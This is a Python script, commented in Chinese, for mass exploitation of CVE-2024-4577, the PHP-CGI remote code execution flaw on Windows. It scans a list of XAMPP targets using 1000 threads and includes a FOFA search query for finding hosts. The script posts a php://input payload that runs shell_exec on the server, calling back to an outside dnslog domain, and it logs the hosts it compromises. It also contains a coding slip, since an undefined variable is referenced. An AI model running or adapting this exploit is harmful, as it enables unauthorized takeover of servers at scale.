#CVE-2024-4577-PHP CGI Windows平台远程代码执行漏洞
#该RCE仅限在简体中文 繁体中文 以及日文操作系统中有效
# FOFA:app="XAMPP" 
#TG https://t.me/WanLiChangChengWanLiChang
import requests
import threading
import queue

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

class MyThread(threading.Thread):
    def __init__(self, queue):
        super(MyThread, self).__init__()
        self.queue = queue

    def run(self):
        while True:
            if self.queue.empty():
                print("批量利用完毕")
                break
            target = self.queue.get(timeout=1)
            self.poc_check(target)

    def poc_check(self, target):
        payloads = [
            '/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
            '/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
        ]
        
        php_check = '<?php echo "WanLiChangChengWanLiChang"; ?>'
        php_cmd = '<?php echo shell_exec("ping win.kyeezvd0.dnslog.pw")?>'
        
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }

        for payload in payloads:
            test_url = f"{target}{payload}"
            try:
                phpcheck = requests.post(test_url, headers=headers, data=php_check, verify=False, timeout=10)
                #response_text = response.text.lower()
                phpcmd = requests.post(test_url, headers=headers, data=php_cmd, verify=False, timeout=10)
                if "WanLiChangChengWanLiChang" in phpcheck.text:
                    # 记录成功利用的目标和响应内容
                    with open('success_url.txt', 'a') as file:
                        file.write(f"{test_url}\n")
                    with open('success.txt', 'a') as file:
                        file.write(f"{test_url}\nResponse: {response.text}\n")
                    print(f"(+) Potential vulnerability detected at: {test_url}")
                else:
                    print(f"(-) No vulnerability detected at: {test_url}")
            except Exception as e:
                print(f"(!) Error testing {test_url}: {e}")

if __name__ == '__main__':
    input_file = "xamp.txt"  # 包含目标IP列表的文件路径
    threads_count = 1000  # 设置线程数
    threads = []
    q = queue.Queue()

    # 读取目标IP列表并加入队列
    with open(input_file, "r") as f:
        for line in f.readlines():
            url = line.strip()
            if not url.startswith("http://") and not url.startswith("https://"):
                url = "http://" + url
            q.put(url)

    # 创建并启动线程
    for _ in range(threads_count):
        threads.append(MyThread(q))

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

    q.join()
